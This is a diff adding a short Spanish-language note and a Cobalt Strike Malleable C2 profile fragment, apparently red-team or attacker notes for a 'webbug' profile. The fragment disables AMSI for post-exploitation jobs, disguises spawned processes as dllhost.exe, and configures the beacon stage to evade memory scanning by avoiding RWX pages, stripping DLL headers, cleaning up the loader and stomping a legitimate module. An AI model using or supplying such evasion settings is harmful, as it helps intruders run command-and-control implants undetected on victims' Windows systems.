@@ -1,0 +1,16 @@
+una cosa importante es antes de lanzar el cobalt, meter esto en el webbug profile:
+
+
+post-ex {
+        set amsi_disable "true";
+        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+        #set spawnto_x64 "%windir%\\System32\\dllhost.exe";
+        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+}
+
+stage {
+        set userwx "false"; #Allocate Beacon DLL as RW/RX rather than RWX.
+        set cleanup "true"; #Free memory associated with reflective loader after it has been loaded
+        set obfuscate "true"; # Load Beacon into memory without its DLL headers
+        set module_x64 "xpsservices.dll"; #Load DLL from disk, then replace its memory with Beacon.
+}
